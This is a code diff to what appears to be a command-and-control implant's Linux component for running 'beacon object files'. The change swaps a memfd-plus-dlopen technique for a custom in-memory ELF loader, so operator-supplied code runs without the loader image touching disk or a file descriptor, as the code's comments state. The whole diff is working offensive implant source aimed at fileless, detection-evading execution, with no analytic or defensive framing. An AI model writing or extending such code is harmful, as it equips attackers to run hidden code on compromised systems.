@@ -3,20 +3,15 @@
  * See c2_bof.h. Linux-only; other platforms get an unsupported stub.
  */
 
-/* _GNU_SOURCE exposes syscall()/SYS_memfd_create under -std=c99. */
-#define _GNU_SOURCE
-
 #include "c2_bof.h"
 
 #ifdef __linux__
 
 #include "util/dynload.h"
+#include "util/elfload.h"
 
-#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/syscall.h>
-#include <unistd.h>
 
 /* ------------------------------------------------------------------------- */
 /* Argument packing                                                           */
@@ -221,31 +216,6 @@ typedef char *(*c2_bof_run_fn)(const uint8_t *obj_buf, size_t object_size,
 typedef const char *(*c2_bof_err_fn)(void);
 typedef void (*c2_bof_free_fn)(char *);
 
-#ifndef MFD_CLOEXEC
-#define MFD_CLOEXEC 0x0001U
-#endif
-
-/* Create an anonymous in-memory file so the loader image never touches disk.
- * Returns -1 when the platform has no memfd_create. */
-static int memfd_new(void) {
-#ifdef SYS_memfd_create
-  return (int)syscall(SYS_memfd_create, "bof", MFD_CLOEXEC);
-#else
-  return -1;
-#endif
-}
-
-static int write_all(int fd, const uint8_t *buf, size_t len) {
-  size_t off = 0;
-  while (off < len) {
-    ssize_t n = write(fd, buf + off, len - off);
-    if (n <= 0)
-      return -1;
-    off += (size_t)n;
-  }
-  return 0;
-}
-
 static char *dup_cstr(const char *s) {
   size_t n = strlen(s) + 1;
   char *p = (char *)malloc(n);
@@ -267,34 +237,31 @@ c2_status c2_bof_run(const uint8_t *loader_so, size_t loader_len,
   if (args_len > (size_t)0x7fffffff)
     return C2_ERR_OVERFLOW;
 
-  int fd = memfd_new();
-  if (fd < 0)
-    return C2_ERR_UNSUPPORTED;
-  if (write_all(fd, loader_so, loader_len) != 0) {
-    close(fd);
-    return C2_ERR_IO;
-  }
-
-  char path[64];
-  if (snprintf(path, sizeof(path), "/proc/self/fd/%d", fd) >=
-      (int)sizeof(path)) {
-    close(fd);
-    return C2_ERR_IO;
-  }
-
+  /* The loader imports dlsym and pthread_mutex_* which live outside libc on
+   * older glibc (libdl.so.2 / libpthread.so.0). Pre-load those host
+   * dependencies so the in-memory relocation pass can bind them; on glibc >=
+   * 2.34 they are in libc and this is a harmless no-op. The loader image
+   * itself is never written to an fd. */
+  static const char *const host_deps[] = {"libdl.so.2", "libpthread.so.0"};
   dynload dl;
   dynload_reset(&dl);
-  void *handle = dynload_open(&dl, path, RTLD_NOW | RTLD_LOCAL);
-  close(fd); /* dlopen keeps the mapping; the fd is no longer needed */
-  if (handle == NULL)
-    return C2_ERR_IO;
+  if (dynload_resolve(&dl) == 0) {
+    for (size_t i = 0; i < sizeof(host_deps) / sizeof(host_deps[0]); i++)
+      (void)dynload_open(&dl, host_deps[i], RTLD_NOW | RTLD_LOCAL);
+  }
 
-  c2_bof_run_fn run = (c2_bof_run_fn)dynload_sym(&dl, handle, "bof_run");
-  c2_bof_err_fn last_err =
-      (c2_bof_err_fn)dynload_sym(&dl, handle, "bof_last_error");
-  c2_bof_free_fn release = (c2_bof_free_fn)dynload_sym(&dl, handle, "bof_free");
+  char err[160];
+  elfload_module *mod = elfload_map(loader_so, loader_len, err, sizeof(err));
+  if (mod == NULL) {
+    *out = dup_cstr(err[0] != '\0' ? err : "loader image rejected");
+    return C2_ERR_IO;
+  }
+
+  c2_bof_run_fn run = (c2_bof_run_fn)elfload_sym(mod, "bof_run");
+  c2_bof_err_fn last_err = (c2_bof_err_fn)elfload_sym(mod, "bof_last_error");
+  c2_bof_free_fn release = (c2_bof_free_fn)elfload_sym(mod, "bof_free");
   if (run == NULL || last_err == NULL || release == NULL) {
-    dynload_close(&dl, handle);
+    elfload_free(mod);
     return C2_ERR_UNSUPPORTED;
   }
 
@@ -305,7 +272,7 @@ c2_status c2_bof_run(const uint8_t *loader_so, size_t loader_len,
     const char *e = last_err();
     if (e != NULL && e[0] != '\0')
       *out = dup_cstr(e);
-    dynload_close(&dl, handle);
+    elfload_free(mod);
     return C2_ERR_PROTO;
   }
 
@@ -313,7 +280,7 @@ c2_status c2_bof_run(const uint8_t *loader_so, size_t loader_len,
    * is unmapped, then hand the copy to the caller. */
   char *copy = dup_cstr(o);
   release(o);
-  dynload_close(&dl, handle);
+  elfload_free(mod);
   if (copy == NULL)
     return C2_ERR_NOMEM;
   *out = copy;
